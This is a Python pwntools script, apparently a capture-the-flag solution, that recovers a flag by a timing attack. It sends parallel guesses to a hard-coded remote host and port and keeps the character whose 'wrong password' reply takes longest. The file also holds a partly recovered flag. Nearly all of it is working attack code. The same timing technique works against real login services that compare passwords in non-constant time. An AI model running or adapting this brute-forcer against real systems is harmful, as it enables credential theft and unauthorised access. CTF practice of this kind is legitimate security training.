from pwn import *
import string
import time
import re
from concurrent.futures import ThreadPoolExecutor

def test_character(host, port, working_password, char):
    try:
        conn = remote(host, port)
        conn.recvuntil(b'wrong!\n')
        guess = working_password + char
        conn.sendline(guess)
        start_time = time.time()
        conn.recvuntil(b'wrong password! cya\n')  # Receive the response
        end_time = time.time()
        conn.close()
        return char, end_time - start_time
    except Exception as e:
        return char, None

def main():
    # NC host and port information
    host = '184.72.87.9'
    port = 8006

    # The current part of the flag that's being guessed
    working_password = 'flag{i_wouldve_used_argon2_but_i_didnt_want_to_kill_our_infr'
    
    # Regex for flag format
    flag_pattern = re.compile(r"flag\{.+?\}")

    # Characters to try (you might need to adjust this set)

    characters = string.ascii_letters + string.digits + "_}"

    while True:
        tasks = {}
        times = {}
        with ThreadPoolExecutor(max_workers=len(characters)) as executor:
            for char in characters:
                future = executor.submit(test_character, host, port, working_password, char)
                tasks[future] = char

            while tasks:
                for future in list(tasks.keys()):
                    if future.done():
                        char, response_time = future.result()
                        if response_time is not None:
                            print(f"Character: '{char}', Time: {response_time} seconds")
                            times[char] = response_time
                        del tasks[future]


        correct_char, max_time = max(times.items(), key=lambda x: x[1])
        print(f"\nCurrent best guess: '{correct_char}', Time: {max_time} seconds\n")

        # Add the correct character to the working password
        working_password += correct_char
        print(f"Updated working password: {working_password}")
        if correct_char == '}':
            print("Flag found!")
            print(working_password)
            break

        # Check if the flag has been completely guessed
        if flag_pattern.match(working_password):
            print(f"Flag found: {working_password}")
            break

if __name__ == "__main__":
    main()
